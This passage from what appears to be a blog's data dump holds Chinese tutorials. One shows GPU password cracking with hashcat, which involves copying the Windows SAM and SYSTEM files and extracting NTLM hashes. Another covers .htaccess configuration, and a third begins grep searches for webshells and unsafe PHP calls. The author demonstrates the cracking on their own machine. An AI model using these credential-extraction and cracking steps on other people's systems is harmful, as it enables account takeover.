href=\"http://asset.creturn.com/asset/uploads/2013/11/224318amdzfb6wrydsiebr.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224318amdzfb6wrydsiebr.png\" alt=\"224318amdzfb6wrydsiebr\"></a></p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224320t0idau0t1r5edyuu.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224320t0idau0t1r5edyuu.png\" alt=\"224320t0idau0t1r5edyuu\"></a></p>\n<p>中机会有提示确认信息，输入大写YES就行</p>\n<p>命令解释：</p>\n<blockquote>\n<p>hashcat后面的参数 -a 3 破解模式 -m 1000 哈是类型 后面的？l?l是匹配符由于我的密码有些复杂所以前面我补上了几位明文，这样能提高点速度（写文章么，总不能等半天）。</p>\n<ol>\n<li>可以看到已经破解出来  </li>\n<li>用命令cat来查看已经破解出来的密码</li>\n</ol>\n</blockquote>\n<p>这种是基于穷举的，也可以用字典。命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">hashcat <span class=\"operator\">-a</span> <span class=\"number\">0</span> -m <span class=\"number\">0</span> hashfile.txt passwordlist.txt</div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>解释下这条命令。-a 0利用字典破解 -m是hash类型0为md5 hashfile.txt为密文，passwordlist.txt为字典，这里就不演示了</p>\n</blockquote>\n","source":"_posts/利用gpu运算工具hashcat爆破window密码.md","raw":"title: \"利用GPU运算工具hashcat爆破window密码\"\nid: 258\ndate: 2012-11-25 12:55:47\ntags: \n- window密码\n- 爆破\ncategories: \n- 原创作品\n- 技术文章\n---\n\n今天介绍一款利用显卡超强运算能力进行爆破密码的工具hashcat，用它来进行爆破window密码\n\n当然他支持的不仅仅是window SAM密码的爆破。\n\n我本机环境和显卡信息如图：\n\n[![224255j1foiui0lrc10rsh](http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png)](http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png)\n\n<!--more-->\n\nhashcat的下载地址为：http://hashcat.net/files_legacy/hashcat-0.40.7z 这个为非gui，如果需要gui的可以去官网下载gui版本\n\n解压后可以看到如图内容：\n\n[![224256bl2n8535y5pvl87n](http://asset.creturn.com/asset/uploads/2013/11/224256bl2n8535y5pvl87n.png)](http://asset.creturn.com/asset/uploads/2013/11/224256bl2n8535y5pvl87n.png)\n\n其中window和linux对应的版本都有。我是64位ubuntu 那么就用hashcat-cli64.bin\n\n为了方便使用我做了一个软链接：\n\n```shell\nln -s /home/return/soft/hack/hashcat/hashcat-cli64.bin /usr/bin/hashcat\n\n```\n\n这样打开终端后不管在什么位置直接输入hashcat就行了，看看它支持的密码类型：\n\n[![224300uew6cie9zieq7cbq](http://asset.creturn.com/asset/uploads/2013/11/224300uew6cie9zieq7cbq.png)](http://asset.creturn.com/asset/uploads/2013/11/224300uew6cie9zieq7cbq.png)\n\n其中红色部分就是sam加密类型\n\n我们先看看hashcat的运算能力怎么。我们用php的md5加密6个z试试看看它进行爆破速度怎么样：\n\n```php\n<?php\n\tfile_put_contents('hashcat.txt',md5('zzzzzz');\n?>\n```\n\n上面代码保存成x.php ,终端下php x.php 会在当前目录下生成hashcat.txt 里面就保存了zzzzz的md5值：\n\n453e41d218e071ccfb2d1c99ce23906a\n\n然后终端输入：\n\n```shell\ntime hashcat -a 3 -m 0 hashcat.txt ?l?l?l?l?l?l\n```\n\n解释下命令：time 用来统计执行这条命令耗费的时间，-a 是破解模式 -m 密码类型 后面的？l 是密码的配置符号。？l为小写字符a-z\n\n结果如图：\n\n[![224303cnhu6wowugpmlpm6](http://asset.creturn.com/asset/uploads/2013/11/224303cnhu6wowugpmlpm6.png)](http://asset.creturn.com/asset/uploads/2013/11/224303cnhu6wowugpmlpm6.png)\n\n可以看到我标记出来的：\n\n1.当前的匹配模式  2.破解结果 3.time 计算出耗费的时间\n\n可以看到穷举6位字母用时14秒效果已经很不错了。当然这个也跟自己的显卡性能有关\n\n接下来回到正题，看看如果破解window密码。破解之前我们还需要两个工具bkhive,和samdump2\n\nubuntu下执行如下命令即可安装\n\n```shell\nsudo apt-get install bkhive\n```\n\n好了。继续，看下我的分区情况。因为现在在ubuntu下我的window在c盘第一分区上装着，如图：\n\n[![224307iz3gs432za1vawbx](http://asset.creturn.com/asset/uploads/2013/11/224307iz3gs432za1vawbx.png)](http://asset.creturn.com/asset/uploads/2013/11/224307iz3gs432za1vawbx.png)\n\n挂在sda1分区到我的/win\n\n```shell\nmkdir /win &amp; mount /dev/sda1 /win\n```\n\n上面命令是在根目录下创建win文件夹并且挂载sda1\n\n看看win下是否挂载成功，如果成功了，可以看到win目录下有window系统c盘（系统盘）的内容\n\n[![224310ayqj3g611m6tgy11](http://asset.creturn.com/asset/uploads/2013/11/224310ayqj3g611m6tgy11.png)](http://asset.creturn.com/asset/uploads/2013/11/224310ayqj3g611m6tgy11.png)\n\n拷贝：cp /win/Windows/System32/config/SYSTEM  和SAM 文件到当前文件夹\n\n然后执行命令如下图：\n\n[![224313ubvwmmtwwfyxlttg](http://asset.creturn.com/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg.png)](http://asset.creturn.com/asset/uploads/2013/11/224313ubvwmmtwwfyxlttg.png)\n\n命令解释：\n\n>1和2是拷贝 SYSTEM和SAM到当前文件夹\n\n>3.根据SYSTEM文件提取bootkey\n\n>4.利用bootkey提取出hash值\n\n提取出来的哈是值如图：\n\n[![224314lf5dy5dq3b95zkkd](http://asset.creturn.com/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd.png)](http://asset.creturn.com/asset/uploads/2013/11/224314lf5dy5dq3b95zkkd.png)\n\nwindow的hash密文其实就是最后两个‘：’号之间的数据，到这里拿到值后其实就可以去网上看下有已经破解的密文了没\n\n可以看如图，已经找到密码了：\n\n[![224317qpwypa77l2gly2zv](http://asset.creturn.com/asset/uploads/2013/11/224317qpwypa77l2gly2zv.png)](http://asset.creturn.com/asset/uploads/2013/11/224317qpwypa77l2gly2zv.png)\n\n那么接下来我们爆破。取出密文，也就是最后两个‘：’之间的数据保存为pwd.txt\n\n执行如下图命令：\n\n[![224318amdzfb6wrydsiebr](http://asset.creturn.com/asset/uploads/2013/11/224318amdzfb6wrydsiebr.png)](http://asset.creturn.com/asset/uploads/2013/11/224318amdzfb6wrydsiebr.png)\n\n[![224320t0idau0t1r5edyuu](http://asset.creturn.com/asset/uploads/2013/11/224320t0idau0t1r5edyuu.png)](http://asset.creturn.com/asset/uploads/2013/11/224320t0idau0t1r5edyuu.png)\n\n中机会有提示确认信息，输入大写YES就行\n\n命令解释：\n\n>hashcat后面的参数 -a 3 破解模式 -m 1000 哈是类型 后面的？l?l是匹配符由于我的密码有些复杂所以前面我补上了几位明文，这样能提高点速度（写文章么，总不能等半天）。\n\n>1. 可以看到已经破解出来  \n>2. 用命令cat来查看已经破解出来的密码\n\n这种是基于穷举的，也可以用字典。命令：\n```shell\nhashcat -a 0 -m 0 hashfile.txt passwordlist.txt\n```\n>解释下这条命令。-a 0利用字典破解 -m是hash类型0为md5 hashfile.txt为密文，passwordlist.txt为字典，这里就不演示了\n","slug":"利用gpu运算工具hashcat爆破window密码","updated":1421659126000,"excerpt":"<p>今天介绍一款利用显卡超强运算能力进行爆破密码的工具hashcat，用它来进行爆破window密码</p>\n<p>当然他支持的不仅仅是window SAM密码的爆破。</p>\n<p>我本机环境和显卡信息如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png\" alt=\"224255j1foiui0lrc10rsh\"></a></p>\n","_id":"9gbjb3jltxqiqn72","comments":true,"layout":"post","photos":[],"link":""},{"title":"使用.htaccess自定义404页面","id":42,"date":1341114674000,"tags":[],"categories":["1bynalp69sca7b8g"],"content":"<h2 id=\"配置\">配置</h2>\n<p>httpd.conf对目录开启</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">AllowOverride <span class=\"keyword\">All</span></div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>然后在目录里放一个.htaccess（.htaccess）</p>\n</blockquote>\n<p>在里面写</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">errorDocument</span> <span class=\"number\">404</span> /<span class=\"number\">404</span>.html（这个的内容根据你的情况改写）</div></pre></td></tr></table></figure>\n\n<p>可是有时候当你用IE浏览的时候会发现，这玩意压根就不跳转</p>\n<p>关键的地方就是这个html</p>\n<p>如果404.html的小于512字节的话，那么IE会认为这个错误页面不够“友好”，会忽视掉的，现在分享出来，遇到相同问题的朋友就知道原因了。</p>\n<p>附:</p>\n<blockquote>\n<p>.htaccess文件(或者”分布式配置文件”提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>\n</blockquote>\n<ul>\n<li><p>子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。</p>\n</li>\n<li><p>.htaccess必须以ASCII模式上传，最好将其权限设置为644。</p>\n</li>\n<li><h2 id=\"错误文档的定位\">错误文档的定位</h2>\n常用的客户端请求错误返回代码：</li>\n</ul>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">401</span> Authorization Required</div><div class=\"line\"><span class=\"number\">403</span> Forbidden</div><div class=\"line\"><span class=\"number\">404</span> <span class=\"keyword\">Not</span> Found</div><div class=\"line\"><span class=\"number\">405</span> <span class=\"function\"><span class=\"keyword\">Method</span> <span class=\"title\">Not</span> <span class=\"title\">Allowed</span></span></div><div class=\"line\">408 <span class=\"title\">Request</span> <span class=\"title\">Timed</span> <span class=\"title\">Out</span></div><div class=\"line\">411 <span class=\"title\">Content</span> <span class=\"title\">Length</span> <span class=\"title\">Required</span></div><div class=\"line\">412 <span class=\"title\">Precondition</span> <span class=\"title\">Failed</span></div><div class=\"line\">413 <span class=\"title\">Request</span> <span class=\"title\">Entity</span> <span class=\"title\">Too</span> <span class=\"title\">Long</span></div><div class=\"line\">414 <span class=\"title\">Request</span> <span class=\"title\">URI</span> <span class=\"title\">Too</span> <span class=\"title\">Long</span></div><div class=\"line\">415 <span class=\"title\">Unsupported</span> <span class=\"title\">Media</span> <span class=\"title\">Type</span></div><div class=\"line\">常见的服务器错误返回代码：</div><div class=\"line\">500 <span class=\"title\">Internal</span> <span class=\"title\">Server</span> <span class=\"title\">Error</span></div></pre></td></tr></table></figure>\n\n<p><a id=\"more\"></a><br>用户可以利用.htaccess指定自己事先制作好的错误提醒页面。一般情况下，人们可以专门设立一个目录，例如errors放置这些页面。然后再.htaccess中，加入如下的指令：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">ErrorDocument <span class=\"number\">404</span> <span class=\"regexp\">/errors/</span>notfound.html</div><div class=\"line\">ErrorDocument <span class=\"number\">500</span> <span class=\"regexp\">/errors/i</span>nternalerror.html</div></pre></td></tr></table></figure>\n\n<p>一条指令一行。上述第一条指令的意思是对于404，也就是没有找到所需要的文档的时候得显示页面为/errors目录下的notfound.html页面。不难看出语法格式为：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ErrorDocument 错误代码 <span class=\"regexp\">/目录名/</span>文件名.扩展名</div></pre></td></tr></table></figure>\n\n<p>如果所需要提示的信息很少的话，不必专门制作页面，直接在指令中使用HTML号了，例如下面这个例子：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">ErrorDocument</span> <span class=\"number\">401</span> ”</div></pre></td></tr></table></figure>\n\n<p>你没有权限访问该页面，请放弃！</p>\n<h3 id=\"文档访问的密码保护\">文档访问的密码保护</h3>\n<p>要利用.htaccess对某个目录下的文档设定访问用户和对应的密码，首先要做的是生成一个.htpasswd的文本文档，例如：</p>\n<p>zheng:y4E7Ep8e7EYV</p>\n<p>这里密码经过加密，用户可以自己找些工具将密码加密成.htaccess支持的编码。该文档最好不要放在www目录下，建议放在www根目录文档之外，这样更为安全些。</p>\n<p>有了授权用户文档，可以在.htaccess中加入如下指令了：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">AuthUserFile .htpasswd的服务器目录</div><div class=\"line\">AuthGroupFile /dev/<span class=\"literal\">null</span> （需要授权访问的目录）</div><div class=\"line\">AuthName EnterPassword</div><div class=\"line\">AuthType Basic （授权类型）</div><div class=\"line\"><span class=\"built_in\">require</span> user wsabstract （允许访问的用户，如果希望表中所有用户都允许，可以使用 <span class=\"built_in\">require</span> valid-user）</div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注，括号部分为学习时候自己添加的注释</p>\n</blockquote>\n<h2 id=\"拒绝来自某个IP的访问\">拒绝来自某个IP的访问</h2>\n<p>如果我不想某个政府部门访问到我的站点的内容，那可以通过.htaccess中加入该部门的IP而将它们拒绝在外。<br>例如：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\"><span class=\"common\">order</span></span> allow,deny</div><div class=\"line\"><span class=\"keyword\"><span class=\"common\">deny</span></span> from 210.10.56.32</div><div class=\"line\"><span class=\"keyword\"><span class=\"common\">deny</span></span> from 219.5.45.</div><div class=\"line\"><span class=\"keyword\"><span class=\"common\">allow</span></span> from <span class=\"literal\">all</span></div></pre></td></tr></table></figure>\n\n<p>第二行拒绝某个IP，第三行拒绝某个IP段，也就是219.5.45.0~219.2.45.255</p>\n<p>想要拒绝所有人？用deny from all好了。不止用IP，也可以用域名来设定。</p>\n<p>保护.htaccess文档</p>\n<p>在使用.htaccess来设置目录的密码保护时，它包含了密码文件的路径。从安全考虑，有必要把.htaccess也保护起来，不让别人看到其中的内容。虽然可以用其他方式做到这点，比如文档的权限。不过，.htaccess本身也能做到，只需加入如下的指令：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\"><span class=\"common\">order</span></span> allow,deny</div><div class=\"line\"><span class=\"keyword\"><span class=\"common\">deny</span></span> from <span class=\"literal\">all</span></div></pre></td></tr></table></figure>\n\n<h2 id=\"URL转向\">URL转向</h2>\n<p>我们可能对网站进行重新规划，将文档进行了迁移，或者更改了目录。这时候，来自搜索引擎或者其他网站链接过来的访问就可能出错。这种情况下，可以通过如下指令来完成旧的URL自动转向到新的地址：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Redirect <span class=\"regexp\">/旧目录/</span>旧文档名 新文档的地址</div></pre></td></tr></table></figure>\n\n<p>或者整个目录的转向：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">Redirect</span> 旧目录 新目录</div></pre></td></tr></table></figure>\n\n<h2 id=\"改变缺省的首页文件\">改变缺省的首页文件</h2>\n<p>一般情况下缺省的首页文件名有default、index等。不过，有些时候目录中没有缺省文件，而是某个特定的文件名，比如在pmwiki中是pmwiki.php。这种情况下，要用户记住文件名来访问很麻烦。在.htaccess中可以轻易的设置新的缺省文件名：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">DirectoryIndex</span> 新的缺省文件名</div></pre></td></tr></table></figure>\n\n<p>也可以列出多个，顺序表明它们之间的优先级别，例如：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">DirectoryIndex filename.html <span class=\"keyword\">index</span>.cgi <span class=\"keyword\">index</span>.pl <span class=\"keyword\">default</span>.htm</div></pre></td></tr></table></figure>\n\n<h2 id=\"防止盗链\">防止盗链</h2>\n<p>如果不喜欢别人在他们的网页上连接自己的图片、文档的话，也可以通过htaccess的指令来做到。</p>\n<p>所需要的指令如下：</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">RewriteEngine <span class=\"command\"><span class=\"keyword\">on</span></span></div><div class=\"line\">RewriteCond % !^$</div><div class=\"line\">RewriteCond % !^<span class=\"keyword\">http</span>://(www.)?creturn.cn…*$ [NC]</div><div class=\"line\">RewriteRule .(gif|jpg)$ – [F]</div><div class=\"line\">如果觉得让别人的页面开个天窗不好看，那可以用一张图片来代替：</div><div class=\"line\">RewriteEngine <span class=\"command\"><span class=\"keyword\">on</span></span></div><div class=\"line\">RewriteCond % !^$</div><div class=\"line\">RewriteCond % !^<span class=\"keyword\">http</span>://(www.)?creturn.cn…*$ [NC]</div><div class=\"line\">RewriteRule .(gif|jpg)$ <span class=\"keyword\">http</span>://www.creturn.cn/替代图片文件名 [R,L]</div></pre></td></tr></table></figure>\n\n","source":"_posts/使用-htaccess自定义404页面.md","raw":"title: \"使用.htaccess自定义404页面\"\nid: 42\ndate: 2012-07-01 11:51:14\ntags: \ncategories: \n- 技术文章\n---\n\n##配置\nhttpd.conf对目录开启\n```config\nAllowOverride All\n```\n\n>然后在目录里放一个.htaccess（.htaccess）\n\n在里面写\n\n```config\nerrorDocument 404 /404.html（这个的内容根据你的情况改写）\n```\n可是有时候当你用IE浏览的时候会发现，这玩意压根就不跳转\n\n关键的地方就是这个html\n\n如果404.html的小于512字节的话，那么IE会认为这个错误页面不够“友好”，会忽视掉的，现在分享出来，遇到相同问题的朋友就知道原因了。\n\n附:\n>.htaccess文件(或者”分布式配置文件”提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n\n- 子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。\n\n- .htaccess必须以ASCII模式上传，最好将其权限设置为644。\n- \n##错误文档的定位\n常用的客户端请求错误返回代码：\n```config\n401 Authorization Required\n403 Forbidden\n404 Not Found\n405 Method Not Allowed\n408 Request Timed Out\n411 Content Length Required\n412 Precondition Failed\n413 Request Entity Too Long\n414 Request URI Too Long\n415 Unsupported Media Type\n常见的服务器错误返回代码：\n500 Internal Server Error\n```\n<!--more-->\n用户可以利用.htaccess指定自己事先制作好的错误提醒页面。一般情况下，人们可以专门设立一个目录，例如errors放置这些页面。然后再.htaccess中，加入如下的指令：\n\n```config\nErrorDocument 404 /errors/notfound.html\nErrorDocument 500 /errors/internalerror.html\n```\n\n一条指令一行。上述第一条指令的意思是对于404，也就是没有找到所需要的文档的时候得显示页面为/errors目录下的notfound.html页面。不难看出语法格式为：\n```config\nErrorDocument 错误代码 /目录名/文件名.扩展名\n```\n\n如果所需要提示的信息很少的话，不必专门制作页面，直接在指令中使用HTML号了，例如下面这个例子：\n\n```config\nErrorDocument 401 ”\n```\n你没有权限访问该页面，请放弃！\n\n###文档访问的密码保护\n\n要利用.htaccess对某个目录下的文档设定访问用户和对应的密码，首先要做的是生成一个.htpasswd的文本文档，例如：\n\nzheng:y4E7Ep8e7EYV\n\n这里密码经过加密，用户可以自己找些工具将密码加密成.htaccess支持的编码。该文档最好不要放在www目录下，建议放在www根目录文档之外，这样更为安全些。\n\n有了授权用户文档，可以在.htaccess中加入如下指令了：\n\n```config\nAuthUserFile .htpasswd的服务器目录\nAuthGroupFile /dev/null （需要授权访问的目录）\nAuthName EnterPassword\nAuthType Basic （授权类型）\nrequire user wsabstract （允许访问的用户，如果希望表中所有用户都允许，可以使用 require valid-user）\n```\n>注，括号部分为学习时候自己添加的注释\n\n##拒绝来自某个IP的访问\n\n如果我不想某个政府部门访问到我的站点的内容，那可以通过.htaccess中加入该部门的IP而将它们拒绝在外。\n例如：\n\n```config\norder allow,deny\ndeny from 210.10.56.32\ndeny from 219.5.45.\nallow from all\n```\n\n第二行拒绝某个IP，第三行拒绝某个IP段，也就是219.5.45.0~219.2.45.255\n\n想要拒绝所有人？用deny from all好了。不止用IP，也可以用域名来设定。\n\n保护.htaccess文档\n\n在使用.htaccess来设置目录的密码保护时，它包含了密码文件的路径。从安全考虑，有必要把.htaccess也保护起来，不让别人看到其中的内容。虽然可以用其他方式做到这点，比如文档的权限。不过，.htaccess本身也能做到，只需加入如下的指令：\n\n```config\norder allow,deny\ndeny from all\n```\n\n##URL转向\n\n我们可能对网站进行重新规划，将文档进行了迁移，或者更改了目录。这时候，来自搜索引擎或者其他网站链接过来的访问就可能出错。这种情况下，可以通过如下指令来完成旧的URL自动转向到新的地址：\n\n```config\nRedirect /旧目录/旧文档名 新文档的地址\n```\n\n或者整个目录的转向：\n```config\nRedirect 旧目录 新目录\n```\n\n##改变缺省的首页文件\n\n一般情况下缺省的首页文件名有default、index等。不过，有些时候目录中没有缺省文件，而是某个特定的文件名，比如在pmwiki中是pmwiki.php。这种情况下，要用户记住文件名来访问很麻烦。在.htaccess中可以轻易的设置新的缺省文件名：\n\n```config\nDirectoryIndex 新的缺省文件名\n```\n\n也可以列出多个，顺序表明它们之间的优先级别，例如：\n\n```config\nDirectoryIndex filename.html index.cgi index.pl default.htm\n```\n\n##防止盗链\n\n如果不喜欢别人在他们的网页上连接自己的图片、文档的话，也可以通过htaccess的指令来做到。\n\n所需要的指令如下：\n\n```config\nRewriteEngine on\nRewriteCond % !^$\nRewriteCond % !^http://(www.)?creturn.cn…*$ [NC]\nRewriteRule .(gif|jpg)$ – [F]\n如果觉得让别人的页面开个天窗不好看，那可以用一张图片来代替：\nRewriteEngine on\nRewriteCond % !^$\nRewriteCond % !^http://(www.)?creturn.cn…*$ [NC]\nRewriteRule .(gif|jpg)$ http://www.creturn.cn/替代图片文件名 [R,L]\n```\n","slug":"使用-htaccess自定义404页面","updated":1421659126000,"excerpt":"<h2 id=\"配置\">配置</h2>\n<p>httpd.conf对目录开启</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">AllowOverride <span class=\"keyword\">All</span></div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>然后在目录里放一个.htaccess（.htaccess）</p>\n</blockquote>\n<p>在里面写</p>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">errorDocument</span> <span class=\"number\">404</span> /<span class=\"number\">404</span>.html（这个的内容根据你的情况改写）</div></pre></td></tr></table></figure>\n\n<p>可是有时候当你用IE浏览的时候会发现，这玩意压根就不跳转</p>\n<p>关键的地方就是这个html</p>\n<p>如果404.html的小于512字节的话，那么IE会认为这个错误页面不够“友好”，会忽视掉的，现在分享出来，遇到相同问题的朋友就知道原因了。</p>\n<p>附:</p>\n<blockquote>\n<p>.htaccess文件(或者”分布式配置文件”提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>\n</blockquote>\n<ul>\n<li><p>子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。</p>\n</li>\n<li><p>.htaccess必须以ASCII模式上传，最好将其权限设置为644。</p>\n</li>\n<li><h2 id=\"错误文档的定位\">错误文档的定位</h2>\n常用的客户端请求错误返回代码：</li>\n</ul>\n<figure class=\"highlight config\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">401</span> Authorization Required</div><div class=\"line\"><span class=\"number\">403</span> Forbidden</div><div class=\"line\"><span class=\"number\">404</span> <span class=\"keyword\">Not</span> Found</div><div class=\"line\"><span class=\"number\">405</span> <span class=\"function\"><span class=\"keyword\">Method</span> <span class=\"title\">Not</span> <span class=\"title\">Allowed</span></span></div><div class=\"line\">408 <span class=\"title\">Request</span> <span class=\"title\">Timed</span> <span class=\"title\">Out</span></div><div class=\"line\">411 <span class=\"title\">Content</span> <span class=\"title\">Length</span> <span class=\"title\">Required</span></div><div class=\"line\">412 <span class=\"title\">Precondition</span> <span class=\"title\">Failed</span></div><div class=\"line\">413 <span class=\"title\">Request</span> <span class=\"title\">Entity</span> <span class=\"title\">Too</span> <span class=\"title\">Long</span></div><div class=\"line\">414 <span class=\"title\">Request</span> <span class=\"title\">URI</span> <span class=\"title\">Too</span> <span class=\"title\">Long</span></div><div class=\"line\">415 <span class=\"title\">Unsupported</span> <span class=\"title\">Media</span> <span class=\"title\">Type</span></div><div class=\"line\">常见的服务器错误返回代码：</div><div class=\"line\">500 <span class=\"title\">Internal</span> <span class=\"title\">Server</span> <span class=\"title\">Error</span></div></pre></td></tr></table></figure>\n\n<p>","_id":"h8kir9r7cjvfy9cz","comments":true,"layout":"post","photos":[],"link":""},{"title":"Linux下利用grep查找webshell","id":21,"date":1341080578000,"tags":["jkk1hzi0kjnqyh4p","2191ch4on5ok5nco"],"categories":["1bynalp69sca7b8g"],"content":"<h2 id=\"WEB_SHELL_排查\">WEB SHELL 排查</h2>\n<p>grep （global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。Unix的grep家族包括grep、egrep和fgrep。**</p>\n<p>利用grep命令我们可以查找常见的漏洞、webshell和其他恶意文件。本文使用的grep版本为2.9，如果你使用一个低于2.5.4的grep，那本片文章中的一些命令可能无法正常工作。可以用grep -v或grep -version确定一下版本。你也可以使用grep –help查看更多信息。如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/1.png\" alt=\"\" title=\"1\"></a><br><a id=\"more\"></a></p>\n<h2 id=\"发现漏洞的常见方法：\">发现漏洞的常见方法：</h2>\n<p>为什么大多数web应用程序都会发现一些不安全的代码，就是因为调用了一些不安全的函数，而又未进行过滤。例如：命令注入或远程代码执行，可以执行客户端传递的参数。这里常常会用到shell_exec函数。我们可以用grep命令搜索文件中存在shell_exec函数的地方，如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “shell_exec *( ” <span class=\"regexp\">/var/</span>www</div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/2.png\" alt=\"\" title=\"2\"></a></p>\n<p>上图中，我们可以看到可能存在漏洞的函数行和路径。</p>\n<p>另一个例子：</p>\n<p>include require include_once和require_once都是可能存在问题的地方，它可能会造成本地文件包含漏洞。</p>\n<p>我们可以使用grep查找出现该函数的地方然后进行测试判断，如下:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “<span class=\"keyword\">include</span> *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “require *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “include_once *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “require_once *(” <span class=\"regexp\">/var/</span>www</div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/3.png\" alt=\"\" 